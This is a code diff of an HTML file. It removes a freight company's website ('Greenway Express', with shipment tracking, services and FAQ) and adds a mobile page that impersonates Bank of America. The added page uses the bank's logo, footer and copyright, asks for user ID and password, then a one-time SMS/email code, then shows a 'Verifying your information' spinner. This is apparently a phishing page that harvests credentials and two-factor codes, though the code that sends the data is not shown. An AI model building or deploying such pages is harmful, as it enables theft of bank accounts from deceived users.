-.detail-row .lbl { color:var(--text-muted); min-width:70px; font-weight:500; }
-.detail-row .val { color:var(--dark); font-weight:600; flex:1; }
-/* Google Maps */
-.map-section { margin-bottom:24px; }
-.map-section h4 { font-size:14px; font-weight:700; color:var(--dark); margin-bottom:12px; display:flex; align-items:center; gap:8px; }
-.map-section h4 i { color:var(--primary); }
-#trackingMapFrame { height:380px; width:100%; border:0; border-radius:12px; overflow:hidden; }
-/* Flight Info */
-.flight-info { display:grid; grid-template-columns:repeat(4,1fr); gap:12px; margin-bottom:24px; }
-.flight-info-item { background:var(--light); border-radius:10px; padding:14px; text-align:center; border:1px solid var(--border); }
-.flight-info-item i { font-size:20px; color:var(--primary); margin-bottom:6px; }
-.flight-info-item .val { font-size:14px; font-weight:700; color:var(--dark); }
-.flight-info-item .lbl { font-size:10px; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px; margin-top:2px; }
-
-/* ANIMATIONS */
-.fade-in { opacity:0; transform:translateY(40px); transition:opacity 0.7s ease, transform 0.7s ease; }
-.fade-in.visible { opacity:1; transform:translateY(0); }
-
-/* RESPONSIVE */
-@media(max-width:1024px) {
-  .nav-links { display:none; }
-  .nav-toggle { display:block; }
-  .nav-links.mobile-open { display:flex; position:absolute; top:100%; left:0; right:0; background:#fff; flex-direction:column; padding:24px; gap:18px; box-shadow:0 12px 32px rgba(0,0,0,0.1); }
-  .nav-links.mobile-open a { color:var(--text); }
-  .about-grid, .coverage-grid, .contact-grid, .quote-inner { grid-template-columns:1fr; }
-  .services-grid, .why-grid, .process-steps, .t-grid, .gallery-grid, .fleet-grid { grid-template-columns:repeat(2,1fr); }
-  .stats-inner { grid-template-columns:repeat(2,1fr); }
-  .process-steps::before { display:none; }
-  .footer-inner { grid-template-columns:1fr 1fr; }
-  .flight-info { grid-template-columns:repeat(2,1fr); }
-}
-@media(max-width:768px) {
-  .section-pad { padding:60px 16px; }
-  .hero { background-attachment:scroll; }
-  .hero-content { padding:80px 16px 40px; }
-  .tracking-box { flex-direction:column; border-radius:12px; }
-  .tracking-box input { border-radius:10px 10px 0 0; text-align:center; }
-  .track-btn { border-radius:0 0 10px 10px; padding:14px; justify-content:center; }
-  .stats-inner { grid-template-columns:1fr 1fr; gap:20px; }
-  .services-grid, .why-grid, .process-steps, .t-grid, .gallery-grid, .fleet-grid, .coverage-stats, .about-features { grid-template-columns:1fr; }
-  .details-grid { grid-template-columns:1fr; }
-  .quote-form .form-row { grid-template-columns:1fr; }
-  .footer-inner { grid-template-columns:1fr; }
-  .flight-info { grid-template-columns:1fr 1fr; }
-  #trackingMapFrame { height:280px; }
-  /* FULL SCREEN TRACKING PORTAL ON PHONE */
-  .track-modal { padding:0; background:rgba(10,31,28,0.95); }
-  .track-modal-box { max-width:100%; border-radius:0; min-height:100vh; }
-  .track-modal-header { padding:16px 20px; position:sticky; top:0; z-index:10; }
-  .track-close { width:44px; height:44px; font-size:22px; }
-  .track-modal-body { padding:20px 16px; }
-  .nav-track-btn { display:none; }
-}
-@media(max-width:480px) {
-  .stats-inner { grid-template-columns:1fr; }
-  .flight-info { grid-template-columns:1fr; }
-  .about-features { grid-template-columns:1fr; }
-  .footer-bottom { flex-direction:column; text-align:center; }
-  .hero h1 { font-size:26px; }
-  .hero p { font-size:14px; }
-  .section-title { font-size:24px; }
-  #trackingMapFrame { height:250px; }
-}
 </style>
 </head>
 <body>
 
-<!-- ===== PRELOADER WITH TRUCK ANIMATION ===== -->
-<div class="preloader" id="preloader">
-  <img src="https://greenwayexpressllc.com/wp-content/uploads/2022/05/logo.svg" alt="Greenway Express">
-  <div class="preloader-text">Loading</div>
-  <div class="preloader-road"></div>
-  <div class="preloader-truck" id="preloaderTruck"><i class="fas fa-truck-fast"></i></div>
+<div class="phone-container">
+  <!-- Header Logo -->
+  <div class="header">
+    <img src="https://res.cloudinary.com/micronetonline/image/upload/c_crop,h_630,w_1200,x_0,y_0/f_auto/q_auto/v1692822585/tenants/7260f163-57c4-4f30-a74c-d693315f02b9/c6aa7e82780f4dd6965c29455bb1212b/bofa-og-logo.png" alt="Bank of America" />
+  </div>
+
+  <div class="content">
+    
+    <!-- STEP 1: LOGIN -->
+    <div id="step1" class="step active">
+      <div class="login-card">
+        <div class="top-line">
+          <div class="line-red"></div>
+          <div class="line-blue"></div>
+        </div>
+        <div class="card-content">
+          <h2>Log in to Online Banking</h2>
+          
+          <div class="input-group">
+            <label for="userId">User ID</label>
+            <input type="text" id="userId" autocomplete="off" />
+          </div>
+          
+          <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" autocomplete="off" />
+          </div>
+          
+          <div class="checkbox-group">
+            <input type="checkbox" id="saveId" />
+            <label for="saveId">Save user ID</label>
+          </div>
+          
+          <button class="btn-login" id="loginBtn1">Log in</button>
+          
+          <div class="links">
+            <a href="#">Forgot user ID/password</a>
+            <a href="#">Security & Help</a>
+            <a href="#">Enroll</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 2: OTP VERIFY -->
+    <div id="step2" class="step">
+      <div class="login-card">
+        <div class="top-line">
+          <div class="line-red"></div>
+          <div class="line-blue"></div>
+        </div>
+        <div class="card-content">
+          <h2>Verify One-Time Password</h2>
+          <p class="subtitle">Check SMS/Email</p>
+          
+          <div class="input-group">
+            <label for="otpCode">Enter code</label>
+            <input type="text" id="otpCode" class="otp-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
+          </div>
+          
+          <button class="btn-login" id="loginBtn2">Login</button>
+          
+          <div class="links">
+            <a href="#">Resend code</a>
+            <a href="#">Security & Help</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 3: LOADING & REDIRECT -->
+    <div id="step3" class="step">
+      <div class="loading-box">
+        <div class="spinner"></div>
+        <div id="loadingText" style="font-size: 14px; color: #666;">Verifying your information...</div>
+        <div id="errorText" class="error-text">Try again in a moment.</div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ==========================================
+       FOOTER SECTION 
+       ========================================== -->
+  <div class="bofa-footer">
+    <div class="footer-links">
+      <a href="https://locators.bankofamerica.com/" target="_blank">Locations</a>
+      <a href="https://www.bankofamerica.com/contactus/" target="_blank">Contact Us</a>
+      <a href="https://www.bankofamerica.com/customer-service/contact-info/help-and-support/" target="_blank">Help & Support</a>
+      <a href="https://www.bankofamerica.com/privacy/overview.go" target="_blank">Privacy & Security</a>
+      <a href="https://www.bankofamerica.com/accessibility/" target="_blank">Accessibility</a>
+      <a href="https://www.bankofamerica.com/online-banking/adchoices.go" target="_blank">AdChoices</a>
+      <a href="https://www.bankofamerica.com/sitemap.go" target="_blank">Site Map</a>
+    </div>
+    
+    <div class="social-section">
+      <p>Connect with us</p>
+      <div class="social-icons">
+        <!-- Facebook -->
+        <a href="https://www.facebook.com/BankofAmerica" target="_blank" title="Facebook">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12c0-5.523-4.477-10-10-10z"/></svg>
+        </a>
+        <!-- Twitter / X -->
+        <a href="https://twitter.com/BankofAmerica" target="_blank" title="Twitter">
+          <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        </a>
+        <!-- LinkedIn -->
+        <a href="https://www.linkedin.com/company/bank-of-america" target="_blank" title="LinkedIn">
+          <svg viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+        </a>
+        <!-- Instagram -->
+        <a href="https://www.instagram.com/bankofamerica" target="_blank" title="Instagram">
+          <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+        </a>
+        <!-- YouTube -->
+        <a href="https://www.youtube.com/user/bankofamerica" target="_blank" title="YouTube">
+          <svg viewBox="0 0 24 24"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/></svg>
+        </a>
+      </div>
+    </div>
+
+    <div class="legal">
+      <p>Bank of America, N.A. Member FDIC.</p>
+      <p><a href="https://patents.bankofamerica.com/" target="_blank">patents.bankofamerica.com</a></p>
+      <p>© 2026 Bank of America Corporation. All rights reserved.</p>
+    </div>
+  </div>
+
 </div>
 
-<!-- SCROLL PROGRESS -->
-<div class="scroll-progress" id="scrollProgress"></div>
-
-<!-- NAVIGATION -->
-<nav class="navbar" id="navbar">
-  <div class="nav-container">
-    <a href="#home" class="nav-logo">
-      <img src="https://greenwayexpressllc.com/wp-content/uploads/2022/05/logo.svg" alt="Greenway Express">
-    </a>
-    <ul class="nav-links" id="navLinks">
-      <li><a href="#home">Home</a></li>
-      <li><a href="#about">About</a></li>
-      <li><a href="#services">Services</a></li>
-      <li><a href="#fleet">Fleet</a></li>
-      <li><a href="#coverage">Coverage</a></li>
-      <li><a href="#faq">FAQ</a></li>
-      <li><a href="#contact">Contact</a></li>
-    </ul>
-    <button class="nav-track-btn" onclick="scrollToTrack()">Track Shipment</button>
-    <button class="nav-toggle" id="navToggle"><i class="fas fa-bars"></i></button>
-  </div>
-</nav>
-
-<!-- HERO — GREEN TRUCK IMAGE AS BACKGROUND -->
-<section class="hero" id="home">
-  <div class="hero-content">
-    <div class="hero-logo-bg">
-      <img src="https://greenwayexpressllc.com/wp-content/uploads/2022/05/logo.svg" alt="Greenway Express">
-    </div>
-    <h1>Global Freight. <span>Delivered with Precision.</span></h1>
-    <p>Your trusted partner in worldwide cargo transportation and logistics solutions. From air freight to ocean cargo, we move your goods across continents with reliability and care.</p>
-    <div class="tracking-box">
-      <input type="text" id="trackInput" placeholder="Enter your tracking number" autocomplete="off" onkeypress="if(event.key==='Enter') trackPackage()">
-      <button class="track-btn" id="trackBtn" onclick="trackPackage()">
-        <i class="fas fa-search"></i> Track Now
-      </button>
-    </div>
-    <div class="track-error" id="trackError"></div>
-  </div>
-  <div class="scroll-indicator" onclick="document.getElementById('about').scrollIntoView({behavior:'smooth'})">
-    <i class="fas fa-chevron-down"></i>
-  </div>
-</section>
-
-<!-- STATS BAR -->
-<section class="stats-bar">
-  <div class="stats-inner">
-    <div class="stat-item">
-      <i class="fas fa-box"></i>
-      <div class="stat-num" data-target="2500000">0</div>
-      <div class="stat-label">Packages Delivered</div>
-    </div>
-    <div class="stat-item">
-      <i class="fas fa-globe-americas"></i>
-      <div class="stat-num" data-target="180">0</div>
-      <div class="stat-label">Countries Served</div>
-    </div>
-    <div class="stat-item">
-      <i class="fas fa-clock"></i>
-      <div class="stat-num" data-target="99" data-suffix="%">0</div>
-      <div class="stat-label">On-Time Rate</div>
-    </div>
-    <div class="stat-item">
-      <i class="fas fa-truck"></i>
-      <div class="stat-num" data-target="500">0</div>
-      <div class="stat-label">Fleet Vehicles</div>
-    </div>
-  </div>
-</section>
-
-<!-- ABOUT -->
-<section class="section-pad about fade-in" id="about">
-  <div class="section-inner">
-    <div class="about-grid">
-      <div class="about-img-wrap">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHhLxS8XPOqUaxeP7QersWjHxBpfVlUqBeE9ugfXOjFQ&s=10" alt="Greenway Express Logistics" onerror="this.src='https://images.unsplash.com/photo-1601584115707-3423aeb8d6a9?auto=format&fit=crop&q=80&w=800';">
-        <div class="about-img-overlay"></div>
-        <div class="about-experience">
-          <div class="num">15+</div>
-          <div class="txt">Years of Excellence in Global Freight & Logistics</div>
-        </div>
-      </div>
-      <div class="about-text">
-        <div class="section-label">Our Story</div>
-        <h2 class="section-title">Building Tomorrow's Logistics Network Today</h2>
-        <p>Founded with a vision to revolutionize global freight, Greenway Express has grown into a trusted name in international cargo transportation. We combine cutting-edge technology with decades of logistics expertise to deliver seamless shipping solutions across air, ocean, and land.</p>
-        <p>Our network spans six continents, connecting businesses and individuals with reliable, efficient, and transparent delivery services. Every package we handle represents our commitment to excellence and our promise of precision.</p>
-        <div class="about-features">
-          <div class="about-feature">
-            <i class="fas fa-shield-alt"></i>
-            <div><h4>Secure Handling</h4><p>Fully insured & tracked</p></div>
-          </div>
-          <div class="about-feature">
-            <i class="fas fa-bolt"></i>
-            <div><h4>Express Delivery</h4><p>Time-critical solutions</p></div>
-          </div>
-          <div class="about-feature">
-            <i class="fas fa-leaf"></i>
-            <div><h4>Eco-Friendly</h4><p>Sustainable logistics</p></div>
-          </div>
-          <div class="about-feature">
-            <i class="fas fa-headset"></i>
-            <div><h4>24/7 Support</h4><p>Round-the-clock assistance</p></div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SERVICES -->
-<section class="section-pad services fade-in" id="services">
-  <div class="section-inner">
-    <div style="text-align:center;">
-      <div class="section-label" style="margin:0 auto 18px;">What We Offer</div>
-      <h2 class="section-title">Comprehensive Freight Solutions</h2>
-      <p class="section-subtitle" style="margin:0 auto 50px;">From urgent air freight to cost-effective ocean shipping, we provide end-to-end logistics services tailored to your needs.</p>
-    </div>
-    <div class="services-grid">
-      <div class="service-card">
-        <div class="service-icon"><i class="fas fa-plane-departure"></i></div>
-        <h3>Air Freight</h3>
-        <p>Priority air cargo services with direct routing to major global hubs. Perfect for time-sensitive shipments requiring rapid international delivery.</p>
-        <a class="service-link">Learn More <i class="fas fa-arrow-right"></i></a>
-      </div>
-      <div class="service-card">
-        <div class="service-icon"><i class="fas fa-ship"></i></div>
-        <h3>Ocean Freight</h3>
-        <p>Full container and less-than-container load shipping across major sea routes. Cost-effective solutions for bulk and heavy cargo worldwide.</p>
-        <a class="service-link">Learn More <i class="fas fa-arrow-right"></i></a>
-      </div>
-      <div class="service-card">
-        <div class="service-icon"><i class="fas fa-truck-fast"></i></div>
-        <h3>Road Transport</h3>
-        <p>Comprehensive ground transportation with dedicated fleets for domestic and cross-border deliveries. Real-time tracking on every vehicle.</p>
-        <a class="service-link">Learn More <i class="fas fa-arrow-right"></i></a>
-      </div>
-      <div class="service-card">
-        <div class="service-icon"><i class="fas fa-route"></i></div>
-        <h3>Express Delivery</h3>
-        <p>Door-to-door express service for urgent packages. Guaranteed delivery windows with priority handling from pickup to drop-off.</p>
-        <a class="service-link">Learn More <i class="fas fa-arrow-right"></i></a>
-      </div>
-      <div class="service-card">
-        <div class="service-icon"><i class="fas fa-warehouse"></i></div>
-        <h3>Warehousing</h3>
-        <p>State-of-the-art storage facilities with climate control, inventory management, and distribution services across strategic global locations.</p>
-        <a class="service-link">Learn More <i class="fas fa-arrow-right"></i></a>
-      </div>
-      <div class="service-card">
-        <div class="service-icon"><i class="fas fa-file-contract"></i></div>
-        <h3>Customs Clearance</h3>
-        <p>Expert customs brokerage services ensuring smooth border crossings. We handle all documentation, duties, and compliance requirements.</p>
-        <a class="service-link">Learn More <i class="fas fa-arrow-right"></i></a>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- FLEET -->
-<section class="section-pad fleet fade-in" id="fleet">
-  <div class="section-inner">
-    <div style="text-align:center;">
-      <div class="section-label" style="margin:0 auto 18px;">Our Fleet</div>
-      <h2 class="section-title">A Fleet Built for Every Journey</h2>
-      <p class="section-subtitle" style="margin:0 auto 50px;">From cargo planes to container ships and delivery trucks, our diverse fleet handles shipments of any size, anywhere in the world.</p>
-    </div>
-    <div class="fleet-grid">
-      <div class="fleet-card">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmFeYF9bF0YXIiZhBybx_XcMiAuyZlqniDQXVa63_JGQ&s" alt="Air Cargo" onerror="this.src='https://images.unsplash.com/photo-1568084680786-a84f095063f5?auto=format&fit=crop&q=80&w=800';">
-        <div class="fleet-tag">Air Cargo</div>
-        <div class="fleet-overlay">
-          <h3>Cargo Aircraft Division</h3>
-          <p>Long-haul freighters serving 6 continents</p>
-        </div>
-      </div>
-      <div class="fleet-card">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRt8YsWmERRlP36-TdA_39yqB1pB5dWql3O0K3D3Am4Ww&s=10" alt="Ocean Freight" onerror="this.src='https://images.unsplash.com/photo-1577412646935-c9c2eb73758e?auto=format&fit=crop&q=80&w=800';">
-        <div class="fleet-tag">Ocean Freight</div>
-        <div class="fleet-overlay">
-          <h3>Container Vessel Fleet</h3>
-          <p>Major sea routes across global ports</p>
-        </div>
-      </div>
-      <div class="fleet-card">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnHK3AbsGyvbfrKiX-6n-i5QTGs2QBVC8wwqgECIiZUA&s=10" alt="Road Transport" onerror="this.src='https://images.unsplash.com/photo-1601584115707-3423aeb8d6a9?auto=format&fit=crop&q=80&w=800';">
-        <div class="fleet-tag">Road Transport</div>
-        <div class="fleet-overlay">
-          <h3>Ground Transport Network</h3>
-          <p>Last-mile delivery & cross-border trucking</p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- COVERAGE -->
-<section class="section-pad coverage fade-in" id="coverage">
-  <div class="section-inner">
-    <div class="coverage-grid">
-      <div>
-        <div class="section-label" style="background:rgba(0,184,96,0.15);">Global Network</div>
-        <h2 class="section-title">Delivering Across Continents</h2>
-        <p class="section-subtitle" style="color:rgba(255,255,255,0.7);">Our extensive network connects origin to destination across 180+ countries, supported by strategic partnerships and owned infrastructure at key logistics hubs worldwide.</p>
-        <div class="coverage-stats">
-          <div class="coverage-stat">
-            <i class="fas fa-map-marked-alt"></i>
-            <div class="num">180+</div>
-            <div class="lbl">Countries</div>
-          </div>
-          <div class="coverage-stat">
-            <i class="fas fa-anchor"></i>
-            <div class="num">450+</div>
-            <div class="lbl">Port Connections</div>
-          </div>
-          <div class="coverage-stat">
-            <i class="fas fa-plane"></i>
-            <div class="num">120+</div>
-            <div class="lbl">Airport Hubs</div>
-          </div>
-          <div class="coverage-stat">
-            <i class="fas fa-building"></i>
-            <div class="num">75+</div>
-            <div class="lbl">Distribution Centers</div>
-          </div>
-        </div>
-      </div>
-      <div class="coverage-map">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyOtMlCUHDiRl-eaTQjI3H3OpcNbWcNb9MJyCxsUvDcQ&s=10" alt="Global Coverage Map" onerror="this.src='https://images.unsplash.com/photo-1589519160732-3fc0588e6c8f?auto=format&fit=crop&q=80&w=800';">
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- WHY US -->
-<section class="section-pad why-us fade-in">
-  <div class="section-inner">
-    <div style="text-align:center;">
-      <div class="section-label" style="margin:0 auto 18px;">Why Choose Us</div>
-      <h2 class="section-title">Logistics That Put You First</h2>
-      <p class="section-subtitle" style="margin:0 auto 50px;">We combine technology, experience, and dedication to deliver a shipping experience that exceeds expectations every time.</p>
-    </div>
-    <div class="why-grid">
-      <div class="why-card">
-        <div class="why-icon"><i class="fas fa-user-shield"></i></div>
-        <h3>Bank-Grade Security</h3>
-        <p>Every shipment is protected by comprehensive insurance and real-time monitoring systems throughout its journey.</p>
-      </div>
-      <div class="why-card">
-        <div class="why-icon"><i class="fas fa-satellite-dish"></i></div>
-        <h3>Live GPS Tracking</h3>
-        <p>Track your cargo in real-time with our advanced satellite tracking system. Know exactly where your shipment is at every moment.</p>
-      </div>
-      <div class="why-card">
-        <div class="why-icon"><i class="fas fa-leaf"></i></div>
-        <h3>Sustainable Logistics</h3>
-        <p>Carbon-neutral shipping options and eco-friendly packaging. We're committed to reducing our environmental footprint.</p>
-      </div>
-      <div class="why-card">
-        <div class="why-icon"><i class="fas fa-hand-holding-usd"></i></div>
-        <h3>Competitive Pricing</h3>
-        <p>Transparent pricing with no hidden fees. Get the best rates for premium service without compromising on quality.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- PROCESS -->
-<section class="section-pad process fade-in">
-  <div class="section-inner">
-    <div style="text-align:center;">
-      <div class="section-label" style="margin:0 auto 18px;">How It Works</div>
-      <h2 class="section-title">Shipping Made Simple in 4 Steps</h2>
-      <p class="section-subtitle" style="margin:0 auto 50px;">From booking to delivery, we've streamlined the entire shipping process for a hassle-free experience.</p>
-    </div>
-    <div class="process-steps">
-      <div class="process-step">
-        <div class="process-num">1</div>
-        <h3>Book & Schedule</h3>
-        <p>Request a quote and schedule your pickup online in minutes with our easy booking system.</p>
-      </div>
-      <div class="process-step">
-        <div class="process-num">2</div>
-        <h3>Pickup</h3>
-        <p>Our team collects your cargo from your location and begins the shipping journey immediately.</p>
-      </div>
-      <div class="process-step">
-        <div class="process-num">3</div>
-        <h3>In Transit</h3>
-        <p>Track your shipment in real-time as it moves through our global logistics network.</p>
-      </div>
-      <div class="process-step">
-        <div class="process-num">4</div>
-        <h3>Delivered</h3>
-        <p>Your cargo arrives safely at its destination with proof of delivery and confirmation.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- GALLERY -->
-<section class="section-pad gallery fade-in">
-  <div class="section-inner">
-    <div style="text-align:center;">
-      <div class="section-label" style="margin:0 auto 18px;">Our Operations</div>
-      <h2 class="section-title">Inside Greenway Express</h2>
-      <p class="section-subtitle" style="color:rgba(255,255,255,0.7); margin:0 auto 50px;">A glimpse into our daily operations across air, ocean, and ground logistics worldwide.</p>
-    </div>
-    <div class="gallery-grid">
-      <div class="gallery-item">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmFeYF9bF0YXIiZhBybx_XcMiAuyZlqniDQXVa63_JGQ&s" alt="Cargo Operations" onerror="this.src='https://images.unsplash.com/photo-1578575437130-9277d652d24a?auto=format&fit=crop&q=80&w=800';">
-        <div class="gallery-overlay">
-          <h4>Air Cargo Loading</h4>
-          <p>Anchorage International Hub</p>
-        </div>
-      </div>
-      <div class="gallery-item">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRt8YsWmERRlP36-TdA_39yqB1pB5dWql3O0K3D3Am4Ww&s=10" alt="Container Shipping" onerror="this.src='https://images.unsplash.com/photo-1577412646935-c9c2eb73758e?auto=format&fit=crop&q=80&w=800';">
-        <div class="gallery-overlay">
-          <h4>Container Terminal</h4>
-          <p>Pacific Ocean Freight Route</p>
-        </div>
-      </div>
-      <div class="gallery-item">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnHK3AbsGyvbfrKiX-6n-i5QTGs2QBVC8wwqgECIiZUA&s=10" alt="Road Freight" onerror="this.src='https://images.unsplash.com/photo-1601584115707-3423aeb8d6a9?auto=format&fit=crop&q=80&w=800';">
-        <div class="gallery-overlay">
-          <h4>Highway Transport</h4>
-          <p>Cross-Border Truck Fleet</p>
-        </div>
-      </div>
-      <div class="gallery-item">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyOtMlCUHDiRl-eaTQjI3H3OpcNbWcNb9MJyCxsUvDcQ&s=10" alt="Global Hub" onerror="this.src='https://images.unsplash.com/photo-1589519160732-3fc0588e6c8f?auto=format&fit=crop&q=80&w=800';">
-        <div class="gallery-overlay">
-          <h4>Distribution Center</h4>
-          <p>Automated Sorting Facility</p>
-        </div>
-      </div>
-      <div class="gallery-item">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHhLxS8XPOqUaxeP7QersWjHxBpfVlUqBeE9ugfXOjFQ&s=10" alt="Logistics Hub" onerror="this.src='https://images.unsplash.com/photo-1568084680786-a84f095063f5?auto=format&fit=crop&q=80&w=800';">
-        <div class="gallery-overlay">
-          <h4>Cargo Operations</h4>
-          <p>Freight Processing Hub</p>
-        </div>
-      </div>
-      <div class="gallery-item">
-        <img src="https://images.unsplash.com/photo-1601584115707-3423aeb8d6a9?auto=format&fit=crop&q=80&w=800" alt="Delivery Fleet" onerror="this.src='https://images.unsplash.com/photo-1601584115707-3423aeb8d6a9?auto=format&fit=crop&q=80&w=800';">
-        <div class="gallery-overlay">
-          <h4>Delivery Fleet</h4>
-          <p>Last-Mile Distribution</p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- TESTIMONIALS -->
-<section class="section-pad testimonials fade-in">
-  <div class="section-inner">
-    <div style="text-align:center;">
-      <div class="section-label" style="margin:0 auto 18px;">Client Stories</div>
-      <h2 class="section-title">Trusted by Businesses Worldwide</h2>
-      <p class="section-subtitle" style="margin:0 auto 50px;">See what our clients have to say about their experience with Greenway Express.</p>
-    </div>
-    <div class="t-grid">
-      <div class="t-card">
-        <div class="t-stars">★★★★★</div>
-        <p>"Greenway Express has transformed our supply chain. Their tracking system gives us complete visibility, and deliveries are always on time. The best logistics partner we've worked with."</p>
-        <div class="t-author">
-          <div class="t-avatar">MR</div>
-          <div><strong>Marcus Reid</strong><span>Operations Director, TechFlow Inc.</span></div>
-        </div>
-      </div>
-      <div class="t-card">
-        <div class="t-stars">★★★★★</div>
-        <p>"We ship globally every week and Greenway Express has never let us down. Their air freight service is incredibly reliable and their team is always available when we need them."</p>
-        <div class="t-author">
-          <div class="t-avatar">SK</div>
-          <div><strong>Sarah Kim</strong><span>Logistics Manager, GlobalTrade Co.</span></div>
-        </div>
-      </div>
-      <div class="t-card">
-        <div class="t-stars">★★★★★</div>
-        <p>"The transparency and real-time tracking are game-changers. Knowing exactly where our cargo is at all times gives us peace of mind. Highly recommend Greenway Express."</p>
-        <div class="t-author">
-          <div class="t-avatar">JD</div>
-          <div><strong>James Donovan</strong><span>CEO, Pacific Imports Ltd.</span></div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- QUOTE -->
-<section class="quote fade-in">
-  <div class="quote-inner">
-    <div class="quote-text">
-      <h2>Get a Free Shipping Quote</h2>
-      <p>Tell us about your shipment and we'll provide a competitive quote within 24 hours. No obligations, just transparent pricing for premium service.</p>
-    </div>
-    <div class="quote-form">
-      <h3>Request Quote</h3>
-      <div class="form-row">
-        <input type="text" placeholder="Origin City" id="quoteOrigin">
-        <input type="text" placeholder="Destination City" id="quoteDest">
-      </div>
-      <select id="quoteType">
-        <option value="">Select Service Type</option>
-        <option value="air">Air Freight</option>
-        <option value="ocean">Ocean Freight</option>
-        <option value="road">Road Transport</option>
-        <option value="express">Express Delivery</option>
-      </select>
-      <input type="text" placeholder="Cargo Description (optional)" id="quoteCargo">
-      <button onclick="submitQuote()">Get My Quote</button>
-    </div>
-  </div>
-</section>
-
-<!-- FAQ -->
-<section class="section-pad faq-sec fade-in" id="faq">
-  <div class="section-inner">
-    <div style="text-align:center;">
-      <div class="section-label" style="margin:0 auto 18px;">FAQ</div>
-      <h2 class="section-title">Frequently Asked Questions</h2>
-      <p class="section-subtitle" style="margin:0 auto 50px;">Find answers to common questions about our shipping and tracking services.</p>
-    </div>
-    <div class="faq-list">
-      <div class="faq-item" onclick="toggleFaq(this)">
-        <div class="faq-q">How can I track my shipment? <i class="fas fa-chevron-down"></i></div>
-        <div class="faq-a">Enter your tracking number in the tracking box at the top of this page and click "Track Now." You'll see real-time status, route map, and delivery progress for your shipment.</div>
-      </div>
-      <div class="faq-item" onclick="toggleFaq(this)">
-        <div class="faq-q">What areas does Greenway Express cover? <i class="fas fa-chevron-down"></i></div>
-        <div class="faq-a">We operate across 180+ countries with coverage on six continents. Our network includes 450+ port connections, 120+ airport hubs, and 75+ distribution centers worldwide.</div>
-      </div>
-      <div class="faq-item" onclick="toggleFaq(this)">
